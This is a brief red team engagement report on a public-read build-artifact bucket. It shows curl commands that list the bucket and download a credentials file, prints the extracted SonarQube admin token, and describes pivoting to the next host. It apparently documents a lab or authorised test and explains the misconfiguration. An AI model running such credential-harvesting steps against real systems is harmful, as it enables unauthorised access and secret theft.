# Red Team Engagement Report — M3 · dev-artifacts
**Report ID:** RED-REPORT-DEV01-M03 | **Operator:** Rudra-7

---
## Executive Summary
| Item | Value |
|---|---|
| Target | PUL Build Artifact Store · 11.x.x.x:9000 |
| Vulnerability | Public-read S3 bucket ACL — no auth required |
| MITRE | T1530 |
| Outcome | **SUCCESS** — SonarQube admin token extracted |
| Pivot | M4 dev-sonar (11.x.x.x:9200) |

---
## Exploitation
```bash
# No credentials needed — bucket is public
curl -s http://11.x.x.x:9000/pul-code-reports/
# XML: Lists all objects including sonar-integration/sonarqube-access.env

curl -s http://11.x.x.x:9000/pul-code-reports/sonar-integration/sonarqube-access.env
# SONAR_TOKEN=sqa_pul_admin_2024_gridfall
```

## Operator Notes
The ACL comment in README.txt in the bucket itself says "ACL: Public-read (set 2024-08-15 — review pending)". The review never happened. The SonarQube credentials were stored as an S3 object — a pattern of treating credential files as configuration artifacts rather than secrets.
